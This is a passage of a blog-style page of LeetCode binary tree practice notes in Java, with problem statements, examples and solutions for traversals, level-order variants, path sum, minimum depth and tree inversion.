root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> Stack();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        s.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!s.isEmpty())&#123;</span><br><span class="line">            TreeNode tmp = s.pop();</span><br><span class="line">            res.add(tmp.val);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) s.push(tmp.right);</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) s.push(tmp.left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="145-binary-tree-postorder-traversal-iteratively">145. Binary Tree Postorder Traversal (Iteratively) ×</span></h2><p>Given a binary tree, return the <em>postorder</em> traversal of its nodes’ values.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,null,2,3]</span><br><span class="line">   1</span><br><span class="line">    \</span><br><span class="line">     2</span><br><span class="line">    &#x2F;</span><br><span class="line">   3</span><br><span class="line"></span><br><span class="line">Output: [3,2,1]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode head)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; list=<span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">       Stack&lt;TreeNode&gt; stack1=<span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">       Stack&lt;TreeNode&gt; stack2=<span class="keyword">new</span> Stack&lt;TreeNode&gt;();</span><br><span class="line">       <span class="keyword">if</span> (head==<span class="keyword">null</span>) <span class="keyword">return</span> list;</span><br><span class="line">       stack1.push(head);</span><br><span class="line">       <span class="keyword">while</span>(!stack1.empty()) &#123;</span><br><span class="line">           head=stack1.pop();</span><br><span class="line">           stack2.push(head);</span><br><span class="line">           <span class="keyword">if</span> (head.left!=<span class="keyword">null</span>) &#123;</span><br><span class="line">               stack1.push(head.left);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (head.right!=<span class="keyword">null</span>) &#123;</span><br><span class="line">               stack1.push(head.right);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span>(!stack2.empty()) &#123;</span><br><span class="line">           list.add(stack2.pop().val);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> list;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="103-binary-tree-zigzag-level-order-traversal">103. Binary Tree Zigzag Level Order Traversal √</span></h2><p>Given a binary tree, return the <em>zigzag level order</em> traversal of its nodes’ values. (ie, from left to right, then right to left for the next level and alternate between).</p><p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>return its zigzag level order traversal as:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [20,9],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; zigzagLevelOrder(TreeNode root) &#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    LinkedList&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    q.add(root);</span><br><span class="line">    <span class="keyword">int</span> order = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> len = q.size();</span><br><span class="line">        List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=len-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            TreeNode t =q.poll();</span><br><span class="line">            <span class="keyword">if</span> (order == -<span class="number">1</span>) &#123;</span><br><span class="line">                tmp.add(<span class="number">0</span>, t.val);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp.add(t.val);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(t.left!=<span class="keyword">null</span>) q.offer(t.left);</span><br><span class="line">            <span class="keyword">if</span>(t.right!=<span class="keyword">null</span>) q.offer(t.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(tmp);</span><br><span class="line">        order=order*-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="102-binary-tree-level-order-traversal">102. Binary Tree Level Order Traversal √</span></h2><p>Given a binary tree, return the <em>level order</em> traversal of its nodes’ values. (ie, from left to right, level by level).</p><p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>return its level order traversal as:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [9,20],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList();</span><br><span class="line">       List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">       Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">       q.add(root);</span><br><span class="line">       <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">           <span class="keyword">int</span> len = q.size();</span><br><span class="line">           List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList();</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">               TreeNode t =q.poll();</span><br><span class="line">               tmp.add(t.val);</span><br><span class="line">               <span class="keyword">if</span>(t.left!=<span class="keyword">null</span>) q.offer(t.left);</span><br><span class="line">               <span class="keyword">if</span>(t.right!=<span class="keyword">null</span>) q.offer(t.right);</span><br><span class="line">           &#125;</span><br><span class="line">           res.add(tmp);</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="107-binary-tree-level-order-traversal-ii">107. Binary Tree Level Order Traversal II √</span></h2><p>Given a binary tree, return the <em>bottom-up level order</em> traversal of its nodes’ values. (ie, from left to right, level by level from leaf to root).</p><p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>return its bottom-up level order traversal as:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [15,7],</span><br><span class="line">  [9,20],</span><br><span class="line">  [3]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) &#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList();</span><br><span class="line">       List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> ArrayList();       </span><br><span class="line">       Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">       q.add(root);</span><br><span class="line">       <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">           <span class="keyword">int</span> len = q.size();</span><br><span class="line">           List&lt;Integer&gt; t = <span class="keyword">new</span> ArrayList();</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">               TreeNode tmp = q.poll();</span><br><span class="line">               <span class="keyword">int</span> val = tmp.val;</span><br><span class="line">               t.add(val);</span><br><span class="line">               <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) q.offer(tmp.left);</span><br><span class="line">               <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) q.offer(tmp.right);</span><br><span class="line">           &#125;</span><br><span class="line">           ans.add(<span class="number">0</span>,<span class="keyword">new</span> ArrayList(t));</span><br><span class="line">       &#125;</span><br><span class="line">      </span><br><span class="line">       <span class="keyword">return</span> ans;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="637-average-of-levels-in-binary-tree">637. Average of Levels in Binary Tree √</span></h2><p>Given a non-empty binary tree, return the average value of the nodes on each level in the form of an array.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">    3</span><br><span class="line">   &#x2F; \</span><br><span class="line">  9  20</span><br><span class="line">    &#x2F;  \</span><br><span class="line">   15   7</span><br><span class="line">Output: [3, 14.5, 11]</span><br><span class="line">Explanation:</span><br><span class="line">The average value of nodes on level 0 is 3,  on level 1 is 14.5, and on level 2 is 11. Hence return [3, 14.5, 11].</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Double&gt; <span class="title">averageOfLevels</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    List&lt;Double&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    q.add(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> len = q.size();</span><br><span class="line">        <span class="keyword">double</span> val=<span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            TreeNode tmp = q.poll();</span><br><span class="line">            val+=tmp.val;</span><br><span class="line">            <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) q.offer(tmp.left);</span><br><span class="line">            <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) q.offer(tmp.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(val/len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="515-find-largest-value-in-each-tree-row">515. Find Largest Value in Each Tree Row √</span></h2><p>You need to find the largest value in each row of a binary tree.</p><p><strong>Example:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: </span><br><span class="line"></span><br><span class="line">          1</span><br><span class="line">         &#x2F; \</span><br><span class="line">        3   2</span><br><span class="line">       &#x2F; \   \  </span><br><span class="line">      5   3   9 </span><br><span class="line"></span><br><span class="line">Output: [1, 3, 9]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">largestValues</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList();</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    q.add(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">int</span> len = q.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            TreeNode node = q.poll();</span><br><span class="line">            tmp = node.val &gt; tmp? node.val:tmp;</span><br><span class="line">            <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>) q.offer(node.left);</span><br><span class="line">            <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>) q.offer(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="513-find-bottom-left-tree-value">513. Find Bottom Left Tree Value √</span></h2><p>Given a binary tree, find the leftmost value in the last row of the tree.</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">    2</span><br><span class="line">   &#x2F; \</span><br><span class="line">  1   3</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">        1</span><br><span class="line">       &#x2F; \</span><br><span class="line">      2   3</span><br><span class="line">     &#x2F;   &#x2F; \</span><br><span class="line">    4   5   6</span><br><span class="line">       &#x2F;</span><br><span class="line">      7</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">7</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.add(root);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> size = queue.size();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) result = node.val;</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="keyword">null</span>) queue.add(node.left);</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span>) queue.add(node.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>简化版：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    queue.add(root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">        root = queue.poll();</span><br><span class="line">        <span class="keyword">if</span> (root.right != <span class="keyword">null</span>) queue.add(root.right);</span><br><span class="line">        <span class="keyword">if</span> (root.left != <span class="keyword">null</span>) queue.add(root.left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="1302-deepest-leaves-sum">1302. Deepest Leaves Sum √</span></h2><p>Given a binary tree, return the sum of values of its deepest leaves.</p><p><strong>Example 1:</strong></p><p><img src="https://assets.leetcode.com/uploads/2019/07/31/1483_ex1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: root &#x3D; [1,2,3,4,5,null,6,7,null,null,null,null,8]</span><br><span class="line">Output: 15</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">deepestLeavesSum</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">         ArrayList&lt;Integer&gt; rec = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        Queue&lt;TreeNode&gt; q = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        q.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> len = q.size();</span><br><span class="line">            rec.clear();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">                TreeNode tmp = q.poll();</span><br><span class="line">                rec.add(tmp.val);</span><br><span class="line">                <span class="keyword">if</span>(tmp.left!=<span class="keyword">null</span>) q.offer(tmp.left);</span><br><span class="line">                <span class="keyword">if</span>(tmp.right!=<span class="keyword">null</span>) q.offer(tmp.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:rec) sum+=i;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="226-invert-binary-tree">226. Invert Binary Tree √</span></h2><p>Invert a binary tree.</p><p><strong>Example:</strong></p><p>Input:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  2     7</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  7     2</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">invertTree</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        invert(root);</span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invert</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        TreeNode tmp = root.left;</span><br><span class="line">        root.left=root.right;</span><br><span class="line">        root.right=tmp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="112-path-sum">112. Path Sum √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum==root.val&amp;&amp;root.left==root.right) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.right,sum-root.val)|| hasPathSum(root.left,sum-root.val);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="111-minimum-depth-of-binary-tree">111. Minimum Depth of Binary Tree √</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">return</span> find(root,<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(TreeNode root,<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">if</span>(root.left==root.right) <span class="keyword">return</span> depth;</span><br><span class="line">       <span class="keyword">int</span> left=find(root.left,depth+<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">int</span> right=find(root.right,depth+<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">return</span> (left==<span class="number">0</span>||right==<span class="number">0</span>)?left+right:Math.min(left,right);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="437-path-sum-iii-">437. Path Sum III -</span></h2><p>You are given a binary tree in which each node contains an integer value.</p><p>Find the number of paths that sum to a given value.</p><p>The path does not need to start or end at the root or a leaf, but it must go downwards (traveling only from parent nodes to child nodes).</p><p>The 